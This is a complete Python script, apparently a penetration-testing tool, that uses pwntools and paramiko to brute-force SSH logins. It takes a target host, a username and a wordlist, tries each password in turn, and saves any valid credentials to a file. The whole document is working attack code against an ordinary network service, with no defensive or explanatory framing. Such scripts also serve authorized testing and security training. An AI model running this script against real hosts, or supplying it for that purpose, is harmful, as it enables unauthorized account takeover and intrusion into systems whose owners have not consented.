from pwn import *
import paramiko
import optparse
import sys

# variables - start

attempts = 0

# variables - end

# functions - start

def cmd_args():
	parser = optparse.OptionParser()
	parser.add_option('-t', '--target', dest='target_host', help='Target Host to run Brute Force attack on')
	parser.add_option('-u', '--user', dest='target_user', help='Username for Brute Force attack')
	parser.add_option('-p', '--passwords', dest='target_password_list', help='Password List for Brute Force attack')
	options, arguments = parser.parse_args()
	return options

# functions - end

# script - start

# check for required arguments
if len(sys.argv) != 7:
	print('\n[!][!] Must provide required arguments for {} to run properly\n\n[!][!] Run {} -h and review arguments list'.format(sys.argv[0], sys.argv[0]))
	sys.exit(100)

# grab arguments form command line
args = cmd_args()
target = args.target_host
username = args.target_user
passwords = args.target_password_list

# pull passwords in fom list
with open(passwords, 'r') as password_list:
	for password in password_list:
		password = password.strip('\n')
		try:
			# message showing logon attempt
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			ssh_response = ssh(host=target, user=username, password=password, timeout=1)
			# conditional to test if logon was successful or failed
			if ssh_response.connected():
				print("[!] Valid password found: '{}'!".format(password))
				ssh_response.close()
				# write successful logon credentials to file
				f = open('credentials.txt', 'w')
				f.write('Host: {}\nUser: {}\nPassword: {}'.format(target, username, password))
				f.close()
				sys.exit(0)
				break
			ssh_response.close()
		# grab error and print custom message on failed logon attempt
		except paramiko.ssh_exception.AuthenticationException:
			print("[x] Invalid logon attempt!")
		attempts += 1

# script - end
